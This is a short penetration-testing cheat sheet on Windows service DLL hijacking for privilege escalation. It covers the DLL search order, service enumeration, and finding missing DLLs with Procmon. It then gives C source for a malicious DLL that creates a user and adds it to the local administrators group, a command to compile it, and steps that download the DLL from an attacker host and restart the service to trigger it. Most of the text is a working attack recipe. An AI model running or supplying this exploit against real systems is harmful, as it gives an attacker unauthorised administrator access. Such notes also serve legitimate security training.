---
title: Service DLL Hijacking
category: privesc
subcategory: windows-services
os: windows
command: Procmon64.exe (Filter for NAME NOT FOUND on .dll)
tools: Procmon, x86_64-w64-mingw32-gcc
---


### Windows DLL search order

1. The directory from which the application loaded
2. The system directory (`C:\Windows\System32`)
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. Directories listed in the `PATH` variable

### Identify candidate

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\Documents\BetaServ.exe
```

### Use Procmon to find missing DLLs

Run `C:\tools\Procmon\Procmon64.exe`, filter by process and `Result == NAME NOT FOUND` on `.dll`. Restart the service to capture loads:

```powershell
Restart-Service BetaService
```

### Build a malicious DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user dave2 password123! /add");
            system("net localgroup administrators dave2 /add");
            break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

### Drop and trigger

```powershell
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
Restart-Service BetaService
net localgroup administrators
```
